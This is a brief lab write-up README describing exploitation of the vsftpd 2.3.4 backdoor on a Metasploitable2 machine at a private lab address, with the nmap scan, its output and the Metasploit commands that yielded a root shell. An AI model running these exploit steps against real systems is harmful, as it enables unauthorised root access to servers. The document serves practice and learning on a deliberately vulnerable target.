# metasploit-labs
#exploited the vsftpd 2.3.4 backdoor
# Metasploitable2: FTP Backdoor Exploit (vsftpd 2.3.4)

## 🔍 Target
- IP: 192.168.32.130
- Service: vsftpd 2.3.4 (Port 21)
- Vulnerability: Malicious backdoor triggered by `:)` username

## 🛠️ Tools Used
- Kali Linux
- Nmap
- Metasploit Framework

## 🔎 Recon
```bash
nmap -sV -p 21 192.168.32.130

Output:
21/tcp open  ftp     vsftpd 2.3.4

💣 Exploitation

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.32.130
set RPORT 21
run

✅ Success: Got root shell via backdoor

🧠 Takeaway
Never run outdated FTP servers

This exploit shows how backdoors can be triggered by simple inputs
